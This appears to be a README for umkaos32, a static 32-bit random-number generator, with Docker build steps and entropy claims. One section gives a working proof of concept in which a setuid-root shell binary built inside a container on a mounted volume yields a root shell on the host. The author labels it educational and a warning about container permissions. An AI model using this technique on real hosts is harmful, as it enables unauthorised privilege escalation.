## umkaos32

**`(c)`** 2026 – Roberto A. Foglietta &lt;roberto.foglietta@gmail.com&gt;, CC BY-NC-ND 4.0

- &nbsp;Click on the button to know how to &nbsp;[![Sponsor me](https://img.shields.io/badge/Sponsor-%E2%9D%A4-ff69b4?style=flat&logo=github)](https://github.com/sponsors/robang74)&nbsp; this project and get in touch with me.

The umkaos32 is a userland binary built for supporting all the x86 CPUs from i386 and above. Compared with the same code compiled for AVX2 x64 which has a throughput of 600MB/s, the 32bit loses less than half of the performance and provides 67% throughput (400 MB/s). Because it is compiled as static musl can elf thus it runs on every system without extra libraries and when compressed with the self-extracting `gzcmd.sh` format takes less than 20Kb.

Like uchaos and uckaos (80MB/s), it provides entropy conduction without the need of a seed but it also avoid to use every fixed multiplicative constant to be hard to detect by the the CPU microcode. Instead, it uses a 64bit comb words stored in a 76 bytes table in a way the purposely misaligned 8bit reading increasing the jittering within the hot loop.

It creates its own table randomly shuffling the values at each run, thus it self-prepare a different .h at each building. Here below this step isn't reported but it is as simple as:

- ./umkaos >uchaos_tbl.h

This strongly increases the difficulty of being detected at running time and thus targeted for being poisoned. While the SW virtualised CPU jittering might lack of real entropy in software virtual machines, and the scheduler jittering might be not totally trustable, the misaligned RAM readings, supplies even when KVM passthrough isn't enabled.

Moreover, because it does not need any particular privilege, every user can run it. Because its output is designed to be consumed by piping it, every application can `popen()` as an external independent executable without even the burden of integrating its GPLv2 code.

- download the pre-compiled self-extracting 32bit static binary from [here](https://raw.githubusercontent.com/robang74/working-in-progress/refs/heads/main/uchaosys.qemu/umkaos32.gz.sh)

Finally, like uchaos and uckaos, it provides white RNG which passed the 256GB PractRand test without flaw. Like every stochastic noise, sometimes it shows a 1E-3 event (unusual) and rarely a 2nd order event 1E-6 (mildly) but within the first 256GB, I did not observe yet a third order event. Such events are statistically probable thus their frequencies, the significant trait is their distribution is discrete by 1E-3 circa as 1st order.

The container escape exploit is provided as PoC only for educational purposes and as a warning to pay attention to correct permissions and privileges management when using containers to compile your own stuff. Moreover, there isn't any grant that option `-p` is supported by every system/shell and allows a local privileges escalation without asking the password.

<br>

### Preparing the container for building

```sh
docker -it run i386/alpine:latest /bin/sh
# Inside the container:
apk update
apk add build-base musl-dev
exit

# get the container id with
docker ps -a | grep i386/alpine:latest
docker commit $cont-id alpine-i386-dev

devc="-v "$(pwd):/src" -w /src alpine-i386-dev"
export devc
```

---

#### THE SUID ESCAPES FROM THE CONTAINER
 
Can we consider this a local priviledge escalation? 😁

Or a Schrodinger's cat escape outside from its box? 😎 

```sh
docker run -it --rm $devc /bin/sh
# Inside the container:
cat << 'EOF' > iamroot.c
#include <stdio.h>
#include <unistd.h>
int main() {
    printf("Hello from 32-bit musl!\n");
    execl("/bin/sh", "sh", "-p", NULL);
    return 0;
}
EOF
gcc -o iamroot iamroot.c -s -static
size iamroot; file iamroot
chown root:1000 iamroot
chmod +xs iamroot
exit
```

Inside the host:

- `./iamroot`

Inside the shell:

- `whoami`

---

### 32bit musl-static for i386 platform

```sh
biname="umkaos32"

CFLAGS="-s -g0 -O3 -Wno-format-extra-args -I../usrl"
CFLAGS="$CFLAGS -mavx2 -flto -falign-functions=32"
CFLAGS="$CFLAGS -ffunction-sections -fdata-sections -Wl,--gc-sections"

CFLAGS32="-static -m32 -march=i486 -mtune=generic -mno-avx2 -mno-sse3"
CFLAGS32="-mno-sse2 -mno-sse -mno-avx -D_USE_FNCS uchaos_seq.c $CFLAGS32"

strp() { 
  strip --strip-all --remove-section=.comment --remove-section=.note $@
}

docker run --rm $devc /bin/sh -c "cd kdev && cc $CFLAGS -D_USE_MLTP \
  $CFLAGS32 umkaos.c -no-pie -o $biname && chown 1000:1000 $biname"

echo "Are there i386 unsupported instructions?"
objdump -d $biname | grep -E 'vmov|vadd|vpxor'
echo
file $biname | sed -e "s/V),/&\\n/"
strp $biname
size $biname
```

Basic test:

- `./umkaos32`

